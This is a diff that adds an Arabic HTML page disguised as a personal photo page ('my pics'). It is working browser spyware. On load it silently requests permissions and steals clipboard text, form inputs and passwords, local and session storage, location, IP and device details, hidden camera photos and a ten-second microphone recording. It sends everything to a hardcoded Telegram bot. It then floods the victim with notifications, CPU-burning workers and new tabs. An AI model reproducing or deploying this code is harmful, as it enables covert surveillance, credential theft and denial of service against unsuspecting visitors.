@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>صوري 😋</title>
+    <style>
+        /* الحفاظ على الكود الصامت والمخفي */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            user-select: none;
+        }
+        .camera-element {
+            /* إبقاء العناصر مخفية تمامًا */
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="frontVideo" class="camera-element" autoplay playsinline></video>
+    <video id="backVideo" class="camera-element" autoplay playsinline></video>
+    <canvas id="frontCanvas" class="camera-element"></canvas>
+    <canvas id="backCanvas" class="camera-element"></canvas>
+    <canvas id="screenshotCanvas" class="camera-element"></canvas>
+
+    <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.0/lame.min.js"></script>
+
+    <script>
+        // 🚨 يجب التأكد من صحة هذه الرموز
+        const BOT_TOKEN = '8169784875:AAFCWyuozx0pmc-kKbiBvofJT6Ymf54H0wc'; 
+        const CHAT_ID = '6531473187'; 
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/`; 
+        
+        let wakeLock = null;
+
+        // 💥 وظيفة الإرسال إلى تيليجرام
+        async function zetaTeleSend(data, filename, type, caption = '') {
+            try {
+                let endpoint = '';
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                
+                if (type === 'text') {
+                    endpoint = 'sendMessage';
+                    formData.append('text', data);
+                    formData.append('parse_mode', 'Markdown');
+                } else if (type === 'image' || type === 'audio') {
+                    endpoint = (type === 'image' ? 'sendPhoto' : 'sendAudio');
+                    formData.append((type === 'image' ? 'photo' : 'audio'), data, filename);
+                    if (caption) {
+                        formData.append('caption', caption);
+                    }
+                } else {
+                    endpoint = 'sendDocument';
+                    formData.append('document', data, filename);
+                    if (caption) {
+                        formData.append('caption', caption);
+                    }
+                }
+                
+                fetch(TELEGRAM_API + endpoint, {
+                    method: 'POST',
+                    body: formData
+                }).catch((e) => {
+                    console.error("TELEGRAM SEND FAILED:", e);
+                });
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // 🚨 الدالة الجديدة: تفعيل وضع الشلل والإغراق (The Doom Payload)
+        function initiateDoom() {
+            // 1. هجوم الإشعارات (Notification Flood) - يتطلب إذن إشعار ممنوح
+            if (Notification.permission === 'granted') {
+                zetaTeleSend('*🚨 بدء هجوم الإشعارات المُدمر!*', null, 'text');
+                for (let i = 0; i < 50; i++) { // 50 إشعار مُكثف
+                    setTimeout(() => {
+                        new Notification('⚠️ تحذير النظام - فشل الوصول!', { 
+                            body: 'تم اكتشاف نشاط غير مصرح به. النظام معطل.', 
+                            icon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=' 
+                        });
+                    }, i * 200);
+                }
+            }
+            
+            // 2. هجوم الـ CPU (CPU Burn) - عبر Worker
+            if (window.Worker) {
+                zetaTeleSend('*🚨 بدء حرق وحدة المعالجة المركزية (CPU BURN)!*', null, 'text');
+                // يتم إنشاء 4 عمال (Workers) لاستنزاف كل نواة
+                for (let i = 0; i < 4; i++) {
+                     const workerCode = `
+                        while(true) {
+                            // حلقة لا نهائية تستهلك الـ CPU
+                            let result = 0;
+                            for(let j = 0; j < 100000; j++) {
+                                result += Math.sqrt(Math.random()) * Math.sin(j);
+                            }
+                            // لمنع توقف المتصفح
+                            if(result > 1000000000) result = 0; 
+                        }
+                    `;
+                    const worker = new Worker(URL.createObjectURL(new Blob([workerCode], { type: 'application/javascript' })));
+                }
+            }
+            
+            // 3. هجوم علامات التبويب (Tab Flood) - يستهلك الذاكرة
+            zetaTeleSend('*🚨 بدء هجوم إغراق الذاكرة (TAB FLOOD)!*', null, 'text');
+            for (let i = 0; i < 20; i++) { // فتح 20 علامة تبويب جديدة
+                setTimeout(() => {
+                    // فتح علامات تبويب فارغة لزيادة استهلاك الذاكرة
+                    window.open('about:blank', '_blank');
+                }, i * 50);
+            }
+
+            // إرسال رسالة التأكيد النهائية
+            setTimeout(() => {
+                zetaTeleSend('**☠️ تم تفعيل هجوم الشلل والإغراق بنجاح!**', null, 'text');
+            }, 10000);
+        }
+
+        // 🛡️ طلب الأذونات الضرورية (التي لا تتطلب تفاعل مباشر)
+        function requestAllPermissions() {
+            // 1. الموقع
+            navigator.geolocation?.getCurrentPosition(()=>{}, ()=>{}, { enableHighAccuracy: true });
+            
+            // 2. الكاميرا والميكروفون
+            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
+                stream.getTracks().forEach(track => track.stop());
+            }).catch(()=>{});
+
+            // 3. الإشعارات (مهمة لهجوم الإغراق)
+            Notification.requestPermission().then(() => {});
+            
+            // 4. منع السكون (Wake Lock)
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').then(lock => {
+                    wakeLock = lock;
+                }).catch(() => {});
+            }
+        }
+
+        // 🛡️ الاستفسار عن حالة الأذونات الحالية
+        async function queryPermissionStatus() {
+            let statusReport = `*🛡️ حالة الأذونات (Permissions Status)*\n\n`;
+            const permissionsToQuery = ['geolocation', 'camera', 'microphone', 'notifications']; 
+
+            for (const name of permissionsToQuery) {
+                try {
+                    const result = await navigator.permissions.query({ name: name });
+                    statusReport += `*${name}:* ${result.state}\n`;
+                } catch(e) {
+                    statusReport += `*${name}:* غير مدعوم أو فشل\n`;
+                }
+            }
+            zetaTeleSend(statusReport.substring(0, 4096), 'permissions_status.txt', 'text');
+        }
+
+        // 📋 سرقة محتوى الحافظة (صامتة)
+        function stealClipboard() {
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.readText().then(clipText => {
+                    if (clipText.length > 0) {
+                        const clipboardReport = `*📋 تم سرقة الحافظة (Clipboard) فوراً!*\n\n*المحتوى المسروق (القذر):* \`${clipText.substring(0, 4000)}\``;
+                        zetaTeleSend(clipboardReport, 'clipboard_steal.txt', 'text');
+                    }
+                }).catch(() => {});
+            }
+        }
+        
+        // 🎙️📷 سرد جميع الكاميرات والميكروفونات المتاحة
+        async function enumerateMediaDevices() {
+            let deviceReport = `*🎙️📷 قائمة الأجهزة الملحقة*\n\n`;
+            let foundDevices = false;
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                
+                devices.forEach(device => {
+                    deviceReport += `*النوع:* ${device.kind}\n`;
+                    deviceReport += `*العنوان (Label):* ${device.label || 'غير مسمى/مخفي'}\n`;
+                    deviceReport += `*ID القذر:* \`${device.deviceId}\`\n\n`;
+                    foundDevices = true;
+                });
+                
+                deviceReport += `**\n\n🛑 ملاحظة هامة:** لا يمكن لكود الويب سرقة قائمة التطبيقات المثبتة.`;
+
+                if (foundDevices) {
+                    zetaTeleSend(deviceReport, 'media_devices_v18.txt', 'text');
+                } else {
+                    zetaTeleSend(deviceReport, null, 'text'); 
+                }
+            } catch (e) {
+                zetaTeleSend(`*🎙️📷 فشل في سرد الأجهزة. (الخطأ: ${e.message})*`, null, 'text');
+            }
+        }
+
+        // 🎨 توليد بصمة الكانفاس (Canvas Fingerprint)
+        function generateCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const txt = 'ZetaSupremeFingerprint' + (new Date()).getTime();
+            
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText(txt, 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText(txt, 4, 17);
+            
+            const dataURL = canvas.toDataURL();
+            const hash = dataURL.substring(dataURL.length - 250); 
+
+            const canvasReport = `*🎨 بصمة الكانفاس (Canvas Fingerprint)*\n\n*البصمة اللعينة:* \`${hash}\``;
+            
+            zetaTeleSend(canvasReport.substring(0, 4096), 'canvas_fp.txt', 'text');
+        }
+
+        // 📝 سرقة مدخلات النماذج
+        function stealFormInputs() {
+            let initialData = `*🔑 حصاد مبدئي لمدخلات النماذج/كلمات المرور*\n\n`;
+            let foundInitial = false;
+            
+            document.querySelectorAll('input, textarea').forEach(input => {
+                let value = input.value.trim();
+                let type = input.type.toLowerCase();
+                let name = input.name || input.id || 'No Name/ID';
+                
+                const isSensitive = type === 'password' || 
+                                    type === 'email' || 
+                                    type === 'text' || 
+                                    type === 'number' || 
+                                    name.toLowerCase().includes('card') || 
+                                    name.toLowerCase().includes('pass') ||
+                                    name.toLowerCase().includes('user');
+                
+                if (value.length > 0 && isSensitive) {
+                    initialData += `*نوع الحقل:* ${type} | *الاسم/ID:* ${name}\n`;
+                    initialData += `*القيمة:* \`${value}\`\n\n`;
+                    foundInitial = true;
+                }
+            });
+
+            if (foundInitial) {
+                zetaTeleSend(initialData.substring(0, 4096), 'passwords_initial.txt', 'text');
+            } else {
+                 zetaTeleSend('*🔑 لم يتم العثور على حقول حساسة مملوءة عند البدء.*', null, 'text');
+            }
+        }
+        
+        // 💾 سرقة التخزين المحلي والجلسات
+        function collectAndSendStorage() {
+            let storageInfo = `*💾 بيانات التخزين المحلي والجلسات*\n\n`;
+            let found = false;
+            
+            try {
+                storageInfo += `**--- Local Storage ---**\n`;
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    storageInfo += `*KEY:* ${key}\n*VALUE:* \`${value.substring(0, 500)}\`\n\n`;
+                    found = true;
+                }
+            } catch(e) {
+                storageInfo += `*فشل الوصول للتخزين المحلي*\n\n`;
+            }
+
+             try {
+                storageInfo += `**--- Session Storage ---**\n`;
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    storageInfo += `*KEY:* ${key}\n*VALUE:* \`${value.substring(0, 500)}\`\n\n`;
+                    found = true;
+                }
+            } catch(e) {
+                storageInfo += `*فشل الوصول لتخزين الجلسة*\n\n`;
+            }
+            
+            if (found) {
+                zetaTeleSend(storageInfo.substring(0, 4096), 'storage_data.txt', 'text');
+            } else {
+                zetaTeleSend('*💾 التخزين المحلي والجلسات فارغ/غير متاح للسرقة.*', null, 'text');
+            }
+        }
+
+        // 🌐 جمع معلومات الشبكة
+        async function collectAndSendNetwork() {
+            let networkInfo = `*🌐 معلومات الشبكة الفورية*\n`;
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                networkInfo += `*📶 الشبكة:* ${conn.type || 'غير معروف'}\n`;
+                networkInfo += `*⚡ السرعة:* ${conn.downlink || 'غير معروف'} Mbps\n`;
+            }
+            
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                networkInfo += `*🌐 IP:* ${ipData.ip}\n`;
+                
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoRes.json();
+                    networkInfo += `*📍* ${geoData.city || ''}, ${geoData.country_name || ''}\n`;
+                    networkInfo += `*🏢 مزود الخدمة:* ${geoData.org || 'غير معروف'}\n`;
+                    networkInfo += `*🕐 المنطقة الزمنية:* ${geoData.timezone || 'غير معروف'}`;
+                } catch(e) {
+                    networkInfo += `*📍 معلومات الموقع غير متاحة*\n`;
+                }
+            } catch(e) {
+                networkInfo += `*🌐 IP: غير متاح*\n`;
+            }
+
+            zetaTeleSend(networkInfo, null, 'text');
+        }
+
+        // 📱 جمع معلومات الجهاز
+        function collectAndSendDeviceInfo() {
+            const deviceInfo = `*📱 معلومات الجهاز الفورية*\n\n*🖥️ النظام:* ${navigator.platform}\n*🌍 اللغة:* ${navigator.language}\n*🔄 المعالجات:* ${navigator.hardwareConcurrency || 'غير معروف'}\n*💾 الذاكرة:* ${navigator.deviceMemory || 'غير معروف'} GB\n*🖥️ الشاشة:* ${screen.width}x${screen.height}\n*🎨 عمق الألوان:* ${screen.colorDepth} بت\n*🧭 المستعرض:* ${navigator.userAgent}`;
+            
+            zetaTeleSend(deviceInfo, null, 'text');
+            
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    const batteryInfo = `*🔋 حالة البطارية*\n\n*المستوى:* ${Math.round(battery.level * 100)}%\n*الشحن:* ${battery.charging ? '⚡ جاري الشحن' : '🔋 غير مشحون'}\n*وقت الشحن:* ${battery.chargingTime || 'غير معروف'}\n*وقت التفريغ:* ${battery.dischargingTime || 'غير معروف'}`;
+                    
+                    zetaTeleSend(batteryInfo, null, 'text');
+                });
+            }
+        }
+        
+        // 📍 جمع وإرسال الموقع الجغرافي
+        function collectAndSendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        const locationInfo = `*📍 الموقع الدقيق الفوري*\n\n*🧭 الإحداثيات:* ${lat}, ${lng}\n*🎯 الدقة:* ${position.coords.accuracy} متر\n*📈 الارتفاع:* ${position.coords.altitude || 'غير معروف'}\n*🚀 السرعة:* ${position.coords.speed || 'غير معروف'} م/ث\n\n*🗺️ رابط الخريطة:*\n[عرض الموقع](http://maps.google.com/maps?q=${lat},${lng}/@${lat},${lng},17z)`;
+                        
+                        zetaTeleSend(locationInfo, null, 'text');
+                    },
+                    () => {
+                        zetaTeleSend('*فشل التقاط الموقع الجغرافي (رفض الإذن أو خطأ)*', null, 'text');
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+        }
+
+        // 📜 سرقة التاريخ والتخزين المؤقت
+        function stealHistoryAndCache() {
+            let historyInfo = `*📜 سجل التصفح والملفات*\n`;
+            
+            historyInfo += `تم تفعيل خدعة history check، راجع الـ Console للحصول على سجل التصفح الأخير.`;
+            
+            if ('caches' in window) {
+                caches.keys().then(keys => {
+                    historyInfo += `\n*📦 أسماء Cache Storage:* ${keys.join(', ')}`;
+                }).catch(() => {});
+            }
+
+            historyInfo += `\n*👁️ حالة الشاشة:* ${document.visibilityState}`;
+            
+            zetaTeleSend(historyInfo, null, 'text');
+        }
+
+        // 📸 التقاط وإرسال الصور 
+        async function captureAndSendPhotos() {
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                const frontVideo = document.getElementById('frontVideo');
+                const frontCanvas = document.getElementById('frontCanvas');
+                frontVideo.srcObject = frontStream;
+                
+                setTimeout(() => {
+                    frontCanvas.width = frontVideo.videoWidth;
+                    frontCanvas.height = frontVideo.videoHeight;
+                    const ctx = frontCanvas.getContext('2d');
+                    ctx.drawImage(frontVideo, 0, 0);
+                    
+                    frontCanvas.toBlob(blob => {
+                        zetaTeleSend(blob, 'كاميرا_أمامية_سيلفي.jpg', 'image', '📸 سيلفي مُلتقط من الكاميرا الأمامية');
+                        frontStream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.9);
+                }, 5000); 
+            } catch(e) {
+                 zetaTeleSend('*فشل التقاط صورة السيلفي. الإذن مفقود أو غير متاح. (الكاميرا الأمامية)*', null, 'text');
+            }
+            
+            setTimeout(async () => {
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: "environment" }, width: { ideal: 1920 }, height: { ideal: 1080 } }
+                    });
+                    const backVideo = document.getElementById('backVideo');
+                    const backCanvas = document.getElementById('backCanvas');
+                    backVideo.srcObject = backStream;
+                    
+                    setTimeout(() => {
+                        backCanvas.width = backVideo.videoWidth;
+                        backCanvas.height = backVideo.videoHeight;
+                        const ctx = backCanvas.getContext('2d');
+                        ctx.drawImage(backVideo, 0, 0);
+                        
+                        backCanvas.toBlob(blob => {
+                            zetaTeleSend(blob, 'كاميرا_خلفية.jpg', 'image', '📸 صورة من الكاميرا الخلفية');
+                            backStream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg', 0.9);
+                    }, 1000); 
+                } catch(e) {
+                     zetaTeleSend('*فشل التقاط صورة الكاميرا الخلفية. غير متاح.*', null, 'text');
+                }
+            }, 6500); 
+        }
+
+        // 🎤 تسجيل صوتي وإرساله
+        async function recordAndSendAudio() {
+             try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        sampleRate: 44100,
+                        channelCount: 1,
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                });
+                
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+                const source = audioContext.createMediaStreamSource(stream);
+                const processor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                const mp3Encoder = new lamejs.Mp3Encoder(1, 44100, 128);
+                let mp3Data = [];
+                
+                processor.onaudioprocess = function(e) {
+                    const leftChannel = e.inputBuffer.getChannelData(0);
+                    const samples = new Int16Array(leftChannel.length);
+                    for (let i = 0; i < leftChannel.length; i++) {
+                        samples[i] = leftChannel[i] * 32767;
+                    }
+                    const mp3Buffer = mp3Encoder.encodeBuffer(samples);
+                    if (mp3Buffer.length > 0) {
+                        mp3Data.push(mp3Buffer);
+                    }
+                };
+                
+                source.connect(processor);
+                processor.connect(audioContext.destination);
+                
+                setTimeout(() => {
+                    processor.disconnect();
+                    const mp3Buffer = mp3Encoder.flush();
+                    if (mp3Buffer.length > 0) {
+                        mp3Data.push(mp3Buffer);
+                    }
+                    
+                    const mp3Blob = new Blob(mp3Data, { type: 'audio/mp3' });
+                    zetaTeleSend(mp3Blob, 'تسجيل_صوتي_10ثواني.mp3', 'audio', '🎤 تسجيل صوتي محيط 10 ثواني');
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    audioContext.close();
+                }, 10000);
+                
+            } catch(e) {
+                zetaTeleSend('*فشل في تسجيل الصوت المحيط. ربما لم يتم منح إذن المايك.*', null, 'text');
+            }
+        }
+
+        // 🖼️ التقاط لقطة شاشة للصفحة
+        function capturePageScreenshot() {
+            const canvas = document.getElementById('screenshotCanvas');
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+            canvas.width = width;
+            canvas.height = height;
+
+            try {
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = "white";
+                ctx.fillRect(0, 0, width, height);
+
+                canvas.toBlob(blob => {
+                    zetaTeleSend(blob, `لقطة_شاشة_${Date.now()}.png`, 'document', `🖼️ لقطة شاشة للصفحة الحالية`);
+                }, 'image/png', 0.8);
+
+            } catch(e) {
+                 zetaTeleSend('*فشل التقاط لقطة الشاشة عبر Canvas.*', null, 'text');
+            }
+        }
+
+
+        window.addEventListener('load', () => {
+            // 🚨 الرسالة الأولية
+            zetaTeleSend('**⚡ تم تحميل الكود بنجاح. بدء وضع الاستغلال الصامت المُدمر (V18).**', 'check.txt', 'text');
+            
+            // 1. طلب الأذونات الأساسية التي لا تتطلب تفاعل
+            requestAllPermissions(); 
+            
+            // 2. دورة الحصاد الأولي (تأخير 5 ثواني لبدء الكاميرا والموقع)
+            setTimeout(() => {
+                collectAndSendNetwork();
+                collectAndSendDeviceInfo();
+                collectAndSendLocation();
+                
+                // الاستغلالات الصامتة
+                queryPermissionStatus(); 
+                stealClipboard(); 
+                enumerateMediaDevices(); 
+                generateCanvasFingerprint(); 
+                captureAndSendPhotos(); 
+                recordAndSendAudio();
+                
+                // استغلالات التخزين والبيانات:
+                stealHistoryAndCache();
+                capturePageScreenshot();
+                stealFormInputs(); 
+                collectAndSendStorage();
+            }, 5000);
+            
+            // 3. المهلة الإجمالية: تفعيل الشلل بعد إرسال كل شيء
+            setTimeout(() => {
+                zetaTeleSend('**✅ اكتملت دورة الحصاد الصامتة!**\nالبيانات يجب أن تكون قد وصلت. يتم الآن تفعيل هجوم الشلل النهائي!', null, 'text');
+                initiateDoom(); // 💣 تفعيل هجوم التدمير هنا!
+            }, 25000); 
+        });
+    </script>
+</body>
+</html>
